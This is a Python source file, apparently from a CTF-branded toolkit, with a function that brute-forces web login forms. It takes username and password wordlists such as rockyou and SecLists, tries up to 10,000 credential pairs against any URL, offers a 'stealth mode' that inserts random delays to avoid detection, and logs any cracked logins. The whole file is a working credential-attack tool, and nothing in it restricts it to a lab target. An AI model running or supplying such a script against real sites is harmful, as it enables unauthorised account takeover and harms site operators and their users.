import requests
import colorama
from colorama import Fore, Style
import random
import time
import os
from datetime import datetime

def log_action(message):
    """Log actions/errors to ctf_log.txt"""
    try:
        with open("data/ctf_log.txt", "a") as f:
            f.write(f"{datetime.now()}: {message}\n")
    except Exception as e:
        print(f"{Fore.RED}[-] Error logging: {e}{Style.RESET_ALL}")

def run_brute_force(url, username_field, password_field, username_file, password_file, mode, stealth_mode, colors):
    """Brute-force web logins like a red team pro"""
    try:
        result = []
        headers = {'User-Agent': 'CTFBlitz/1.0'}
        # Load usernames
        if not os.path.exists(username_file):
            log_action(f"Username file not found: {username_file}")
            return f"{colors['error']}[-] Username file {username_file} not found! Download from SecLists.{Style.RESET_ALL}"
        with open(username_file) as f:
            usernames = [line.strip() for line in f if line.strip()]
            if not usernames:
                log_action(f"Username file empty: {username_file}")
                return f"{colors['error']}[-] Username file is empty!{Style.RESET_ALL}"
        # Generate username variants for Normal mode
        base_user = usernames[0] if usernames else "admin"
        username_variants = [base_user, base_user+"1", base_user+"_", base_user+"123", base_user+"admin"]
        usernames = list(set(username_variants + usernames[:10])) if mode == "Normal" else usernames[:1000]
        # Load passwords
        if mode == "Normal":
            if not os.path.exists("data/ctf_creds.txt"):
                log_action("data/ctf_creds.txt not found")
                return f"{colors['error']}[-] data/ctf_creds.txt not found!{Style.RESET_ALL}"
            with open("data/ctf_creds.txt") as f:
                creds = [line.strip().split(":") for line in f if ":" in line]
        else:
            if not os.path.exists(password_file):
                log_action(f"Password file not found: {password_file}")
                return f"{colors['error']}[-] Password file {password_file} not found! Create from rockyou.txt (first 10,000 lines).{Style.RESET_ALL}"
            with open(password_file) as f:
                passwords = [line.strip() for line in f if line.strip()][:10000]
                creds = [(u, p) for u in usernames for p in passwords]
        print(f"{colors['success']}[+] Brute-forcing {url}... Time to crack some logins!{Style.RESET_ALL}")
        log_action(f"Starting brute-force on {url} with {len(creds)} credential pairs")
        for i, (username, password) in enumerate(creds[:50 if mode == "Normal" else 10000]):
            if stealth_mode and i % 100 == 0 and i > 0:
                time.sleep(random.uniform(0.5, 2))
            try:
                data = {username_field: username, password_field: password, "Login": "Login"}
                response = requests.post(url, data=data, headers=headers, allow_redirects=False, timeout=5)
                log_action(f"Tried {username}:{password}, Status: {response.status_code}, URL: {response.url}")
                if response.status_code == 302 and "Login failed" not in response.text:
                    result.append(f"Pwned! Success: {username}:{password}")
                    log_action(f"Brute-force success: {username}:{password}")
                    with open("data/ctf_results.json", "a") as f:
                        f.write(f'{{"timestamp": "{datetime.now()}", "tool": "Mega Brute-Forcer", "result": "Pwned! Success: {username}:{password}"}}\n')
                    return "\n".join(result)
            except Exception as e:
                log_action(f"Brute-force attempt failed for {username}:{password}: {e}")
                continue
        log_action(f"Brute-force completed on {url}, no credentials found")
        return "\n".join(result) or f"{colors['error']}[-] No credentials found! Try another login page!{Style.RESET_ALL}"
    except Exception as e:
        log_action(f"Brute-force error: {e}")
        return f"{colors['error']}[-] Brute-force error: {e}{Style.RESET_ALL}"